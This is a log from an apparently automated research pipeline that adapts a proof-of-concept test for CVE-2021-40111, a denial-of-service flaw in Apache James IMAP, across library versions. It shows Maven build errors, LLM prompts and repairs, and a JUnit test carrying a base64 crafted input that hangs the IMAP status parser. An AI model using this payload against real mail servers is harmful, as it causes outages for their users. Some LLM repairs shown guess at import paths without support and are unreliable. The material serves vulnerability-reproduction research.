[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol
  symbol:   class DecodingException
  location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,102] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 6 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.304 s
[INFO] Finished at: 2025-07-13T15:33:54Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,102] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 141 (prompt), 15 (completion), 156 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class DecodingException, package org.apache.james.imap.decode 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.decode.DecodingException; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.DecodingException;DecodingException
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.DecodingException', 'DecodingException'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 36, 'message': 'cannot find symbol', 'symbol': 'class DecodingException', 'location': 'package org.apache.james.imap.decode', 'code_line': 'import org.apache.james.imap.decode.DecodingException;'} with cause: ['org.apache.james.imap.decode.DecodingException', 'DecodingException'][0m
[96m[Adapter] Related diffs for error: [(4943, 10.0), (2, 0.0), (3, 0.0), (4, 0.0), (5, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class DecodingException cause: ['org.apache.james.imap.decode.DecodingException', 'DecodingException'][0m
[96m[RepairModule] Trying best diff #4943 with score 10.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #4943 with score 10.00[0m
[LLMClient] Tokens used: 739 (prompt), 458 (completion), 1197 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class DecodingException, location: package org.apache.james.imap.decode

### Error Position:
import org.apache.james.imap.decode.DecodingException;

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/DecodingException.java, Hunk: @@ -17,7 +17,7 @@
  * under the License.                                           *
  ****************************************************************/

+package org.apache.james.protocols.imap;
-package org.apache.james.imap.decode;

 import java.io.IOException;

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class DecodingException', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #4943 at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1788 (prompt), 1 (completion), 1789 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.455 s
[INFO] Finished at: 2025-07-13T15:34:33Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 144 (prompt), 9 (completion), 153 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, class edu.vision.se.Testcase1 

The test executes as expected in 3.5.0 

Error code:                         new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession())) 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
Tag;edu.vision.se.Testcase1
[96m[ErrorManager] Extracted key entities: ['Tag', 'edu.vision.se.Testcase1'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 28, 'column': 59, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'class edu.vision.se.Testcase1', 'code_line': '                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))'} with cause: ['Tag', 'edu.vision.se.Testcase1'][0m
[LLMClient] Tokens used: 170 (prompt), 5 (completion), 175 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, class edu.vision.se.Testcase1 

The test executes as expected in 3.5.0 

Error code:                         new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession())) 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['Tag', 'edu.vision.se.Testcase1'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
Tag;Testcase1
[96m[ErrorManager] Extracted key entities: ['Tag', 'Testcase1'][0m
[96m[Adapter] Related diffs for error: [(270, 5.0), (286, 5.0), (301, 5.0), (310, 5.0), (1234, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['Tag', 'Testcase1'][0m
[96m[RepairModule] Trying best diff #270 with score 5.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(286, 310) with score 5.00[0m
[LLMClient] Tokens used: 977 (prompt), 491 (completion), 1468 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: class edu.vision.se.Testcase1

### Error Position:
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))

### Related Diff:
Operation: MODIFIED, File: backends-common/rabbitmq/src/test/java/org/apache/james/backends/rabbitmq/InMemoryConsumer.java, Hunk: @@ -50,7 +50,7 @@ public InMemoryConsumer(Channel channel, Operation operation) {

     @Override
     public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {
+        operation.perform();
-        operation.perform(envelope, body);
         Integer payload = Integer.valueOf(new String(body, StandardCharsets.UTF_8));
         messages.add(payload);
     }
Operation: MODIFIED, File: checkstyle.xml, Hunk: @@ -230,12 +226,9 @@
     </module>
     <module name="JavadocMethod">
       <property name="severity" value="ignore"/>
+      <property name="minLineCount" value="2"/>
       <property name="allowedAnnotations" value="Override, Test"/>
       <property name="scope" value="public"/>
+      <property name="allowThrowsTagsForSubclasses" value="true"/>
       <property name="allowMissingParamTags" value="true"/>
+      <property name="allowMissingThrowsTags" value="true"/>
       <property name="allowMissingReturnTag" value="true"/>
       <metadata name="net.sf.eclipsecs.core.lastEnabledSeverity" value="inherit"/>
     </module>

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Based on the error and the diff provided (though the diff doesn't directly show the Tag class), I'll modify the test file to add the missing import for the Tag class:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.message.Tag;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
